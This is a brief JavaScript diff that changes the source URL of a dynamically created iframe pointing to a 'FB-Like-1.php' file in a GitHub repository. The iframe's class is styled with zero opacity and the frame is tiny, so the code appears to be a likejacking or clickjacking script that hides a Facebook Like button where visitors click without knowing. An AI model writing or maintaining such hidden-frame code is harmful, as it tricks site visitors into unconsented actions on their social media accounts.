@@ -48,7 +48,7 @@ document.write("<style>.CSS_Seguir{ overflow:hidden;opacity:0; filter:alpha(opac
 var sx = document.createElement('iframe'); 
 sx.setAttribute("class", "CSS_Seguir"); 
 sx.setAttribute("id", "DivSeguir"); 
-sx.setAttribute("src", "https://rawgit.com/gilbob/FB-TEST/master/FB-Like-1.php"); 
+sx.setAttribute("src", "https://raw.githubusercontent.com/gilbob/FB-TEST/master/FB-Like-1.php"); 
 sx.setAttribute("scrolling", "no"); 
 sx.setAttribute("frameborder", "0"); 
 sx.setAttribute("style", "overflow:hidden; width:36px; height:20px;"); 
